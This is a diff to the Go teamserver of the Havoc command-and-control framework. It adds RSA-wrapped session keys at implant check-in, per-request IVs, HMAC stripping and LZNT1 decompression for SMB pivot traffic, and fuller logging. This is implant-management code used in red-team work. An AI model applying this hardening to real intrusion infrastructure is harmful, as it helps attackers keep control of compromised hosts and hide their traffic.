@@ -17,6 +17,7 @@ import (
 	"time"
 
 	"Havoc/pkg/common"
+	"Havoc/pkg/common/crypt"
 	"Havoc/pkg/common/parser"
 	"Havoc/pkg/logger"
 	"Havoc/pkg/logr"
@@ -2347,7 +2348,11 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 		Message["Type"] = "Info"
 		Message["Message"] = "Received checkin request"
 
-		if Parser.Length() >= 32+16 {
+		// [HVC-005 2026-03-28] DemonMetaData(Header=FALSE) now sends a 256-byte
+		// RSA-OAEP-SHA256 ciphertext wrapping the 48-byte AES key material instead
+		// of the old plaintext 32+16 bytes.  Decrypt to recover the session keys.
+		const rsaCiphertextLen = 256
+		if Parser.Length() >= rsaCiphertextLen {
 			var (
 				DemonID      int
 				Hostname     string
@@ -2369,8 +2374,15 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 				WorkingHours int32
 			)
 
-			a.Encryption.AESKey = Parser.ParseAtLeastBytes(32)
-			a.Encryption.AESIv = Parser.ParseAtLeastBytes(16)
+			rsaCiphertext := Parser.ParseAtLeastBytes(rsaCiphertextLen)
+			keyMaterial, rsaErr := teamserver.AgentRSADecrypt(rsaCiphertext)
+			if rsaErr != nil || len(keyMaterial) < 48 {
+				logger.Error(fmt.Sprintf("Agent: %x, Command: COMMAND_CHECKIN, RSA key unwrap failed: %v", AgentID, rsaErr))
+				teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+				break
+			}
+			a.Encryption.AESKey = keyMaterial[0:32]
+			a.Encryption.AESIv = keyMaterial[32:48]
 
 			if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt64, parser.ReadInt32}) {
 				DemonID = Parser.ParseInt32()
@@ -3771,7 +3783,7 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 						a.RequestCompleted(RequestID)
 					}
 				} else {
-					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC - DEMON_COMMAND_PROC_CREATE, Invalid packet: %d", AgentID))
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PROC - DEMON_COMMAND_PROC_CREATE, Invalid packet", AgentID))
 				}
 
 				// TODO: can we expect more messages from this request?
@@ -4620,7 +4632,7 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 							Output["Output"] = "\n" + Buffer
 							a.RequestCompleted(RequestID)
 						} else {
-							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_FIND_TOKENS, Invalid packet: %d", AgentID))
+							logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_TOKEN - DEMON_COMMAND_TOKEN_FIND_TOKENS, Invalid packet", AgentID))
 						}
 					} else {
 						Output["Type"] = typeError
@@ -5250,7 +5262,8 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 									} else {
 										// if the agent doesn't exist then we assume that it's a register request from a new agent
 
-										DemonInfo = ParseDemonRegisterRequest(AgentHdr.AgentID, AgentHdr.Data, "")
+										// [HVC-005 2026-03-28] Pass RSA decrypt so the pivot registration can unwrap keys.
+										DemonInfo = ParseDemonRegisterRequest(AgentHdr.AgentID, AgentHdr.Data, "", teamserver.AgentRSADecrypt)
 										DemonInfo.Pivots.Parent = a
 
 										a.Pivots.Links = append(a.Pivots.Links, DemonInfo)
@@ -5347,11 +5360,47 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 
 				if Parser.CanIRead([]parser.ReadType{parser.ReadBytes}) {
 					var (
-						Package       = Parser.ParseBytes()
-						AgentHdr, err = ParseHeader(Package)
+						Package = Parser.ParseBytes()
 					)
 
+					logger.Debug(fmt.Sprintf("Agent: %x, DEMON_PIVOT_SMB_COMMAND: received pivot packet, raw=%d bytes", AgentID, len(Package)))
+
+					// [HVC-006 2026-03-28] The child Demon's PackageTransmitAll appends a
+					// 32-byte HMAC-SHA256 tag after the wire buffer. ParseHeader must receive
+					// only the WireBuffer (without the tag) so the SIZE field is consistent.
+					// Probe the raw packet on a copy to identify the child agent, then strip
+					// the HMAC tail before the real parse.
+					const HmacTagSize = 32
+
+					probeCopy := make([]byte, len(Package))
+					copy(probeCopy, Package)
+					probeHdr, probeErr := ParseHeader(probeCopy)
+
+					var (
+						AgentHdr  Header
+						parseData []byte
+						err       error
+					)
+
+					if probeErr == nil &&
+						probeHdr.MagicValue == DEMON_MAGIC_VALUE &&
+						teamserver.AgentExist(probeHdr.AgentID) &&
+						len(Package) > HmacTagSize {
+						// Known pivot child — strip the HMAC tail before parsing.
+						parseData = Package[:len(Package)-HmacTagSize]
+						logger.Debug(fmt.Sprintf("Agent: %x, DEMON_PIVOT_SMB_COMMAND: pivot %08x — stripped HMAC (%d→%d bytes)",
+							AgentID, probeHdr.AgentID, len(Package), len(parseData)))
+					} else {
+						// Unknown child or too-short packet — try parsing as-is.
+						parseData = Package
+					}
+
+					AgentHdr, err = ParseHeader(parseData)
+
 					if err == nil {
+
+						logger.Debug(fmt.Sprintf("Agent: %x, DEMON_PIVOT_SMB_COMMAND: child header parsed — childID=%08x magic=%08x data=%d bytes compressed=%v",
+							AgentID, AgentHdr.AgentID, AgentHdr.MagicValue, AgentHdr.Data.Length(), AgentHdr.Compressed))
 
 						if AgentHdr.MagicValue == DEMON_MAGIC_VALUE {
 							var PivotAgent *Agent
@@ -5359,38 +5408,83 @@ func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.
 							PivotAgent = teamserver.AgentInstance(AgentHdr.AgentID)
 							if PivotAgent != nil {
 								PivotAgent.UpdateLastCallback(teamserver)
-								//logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_SMB_COMMAND, Linked Agent: %s, Command: %d", AgentID, PivotAgent.NameID, Command))
+								logger.Debug(fmt.Sprintf("Agent: %x, DEMON_PIVOT_SMB_COMMAND: pivot agent %s found, compressed=%v, data=%d bytes",
+									AgentID, PivotAgent.NameID, AgentHdr.Compressed, AgentHdr.Data.Length()))
 
-								// while we can read a command and request id, parse new packages
+								// [HVC-004 2026-03-28] Per-request IV sits between the outer
+								// plaintext CommandID+RequestID and the AES-encrypted payload.
+								// first_iter reads the two plaintext fields first, then extracts
+								// the 16-byte IV and decrypts the remainder — identical to the
+								// pattern used in handlers.go for HTTP agents.
 								first_iter := true
 								for (AgentHdr.Data.CanIRead(([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}))) {
-									var Command   = uint32(AgentHdr.Data.ParseInt32())
-									var Request   = uint32(AgentHdr.Data.ParseInt32())
+									var Command = uint32(AgentHdr.Data.ParseInt32())
+									var Request = uint32(AgentHdr.Data.ParseInt32())
+
+									logger.Debug(fmt.Sprintf("Agent: %x, DEMON_PIVOT_SMB_COMMAND: pivot %s loop — Command=0x%x Request=0x%x first_iter=%v",
+										AgentID, PivotAgent.NameID, Command, Request, first_iter))
 
 									if first_iter {
 										first_iter = false
-										// if the message is not a reconnect, decrypt the buffer
-										AgentHdr.Data.DecryptBuffer(PivotAgent.Encryption.AESKey, PivotAgent.Encryption.AESIv)
+										PacketIV := AgentHdr.Data.ParseAtLeastBytes(16)
+										logger.Debug(fmt.Sprintf("Agent: %x, DEMON_PIVOT_SMB_COMMAND: extracted 16-byte IV, decrypting %d bytes for pivot %s",
+											AgentID, AgentHdr.Data.Length(), PivotAgent.NameID))
+										AgentHdr.Data.DecryptBuffer(PivotAgent.Encryption.AESKey, PacketIV)
+										logger.Debug(fmt.Sprintf("Agent: %x, DEMON_PIVOT_SMB_COMMAND: decrypted OK, remaining=%d bytes compressed=%v",
+											AgentID, AgentHdr.Data.Length(), AgentHdr.Compressed))
+
+										// [HVC-007 2026-03-28] Decompress if child set bit 31 of SIZE.
+										if AgentHdr.Compressed {
+											decompressed, dcErr := crypt.DecompressLZNT1(AgentHdr.Data.Buffer())
+											if dcErr != nil {
+												logger.Error("HVC-007: LZNT1 decompress failed for SMB pivot " + PivotAgent.NameID + ": " + dcErr.Error())
+												break
+											}
+											AgentHdr.Data = parser.NewParser(decompressed)
+											logger.Debug(fmt.Sprintf("Agent: %x, DEMON_PIVOT_SMB_COMMAND: LZNT1 decompressed to %d bytes",
+												AgentID, AgentHdr.Data.Length()))
+										}
 									}
 
 									/* The agent is sending us the result of a task */
 									if Command != COMMAND_GET_JOB {
+										logger.Debug(fmt.Sprintf("Agent: %x, DEMON_PIVOT_SMB_COMMAND: dispatching Command=0x%x Request=0x%x for pivot %s",
+											AgentID, Command, Request, PivotAgent.NameID))
 										Parser := parser.NewParser(AgentHdr.Data.ParseBytes())
 										PivotAgent.TaskDispatch(Request, Command, Parser, teamserver)
+									} else {
+										// Count how many COMMAND_PIVOT delivery jobs the parent
+										// already has queued for this child so the operator can
+										// confirm the relay pipeline is moving.
+										pendingDelivery := 0
+										if PivotAgent.Pivots.Parent != nil {
+											for _, pj := range PivotAgent.Pivots.Parent.JobQueue {
+												if pj.Command == COMMAND_PIVOT {
+													pendingDelivery++
+												}
+											}
+										}
+										logger.Debug(fmt.Sprintf("Agent: %x, DEMON_PIVOT_SMB_COMMAND: pivot %s GET_JOB checkin — child_task_queue=%d parent_pending_COMMAND_PIVOT=%d",
+											AgentID, PivotAgent.NameID, len(PivotAgent.JobQueue), pendingDelivery))
 									}
 								}
+								logger.Debug(fmt.Sprintf("Agent: %x, DEMON_PIVOT_SMB_COMMAND: pivot %s packet processing complete",
+									AgentID, PivotAgent.NameID))
 							} else {
 								Message["Type"] = "Error"
 								Message["Message"] = fmt.Sprintf("Can't process output for %x: Agent not found", AgentHdr.AgentID)
+								logger.Error(fmt.Sprintf("Agent: %x, DEMON_PIVOT_SMB_COMMAND: pivot agent %x not found in registry", AgentID, AgentHdr.AgentID))
 							}
 
 						} else {
 							Message["Type"] = "Error"
 							Message["Message"] = "[SMB] Response magic value isn't demon type"
+							logger.Error(fmt.Sprintf("Agent: %x, DEMON_PIVOT_SMB_COMMAND: unexpected magic value 0x%x", AgentID, AgentHdr.MagicValue))
 						}
 					} else {
 						Message["Type"] = "Error"
 						Message["Message"] = "[SMB] Failed to parse agent header: " + err.Error()
+						logger.Error(fmt.Sprintf("Agent: %x, DEMON_PIVOT_SMB_COMMAND: ParseHeader failed: %s", AgentID, err.Error()))
 					}
 				} else {
 					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_PIVOT - DEMON_PIVOT_SMB_COMMAND, Invalid packet", AgentID))
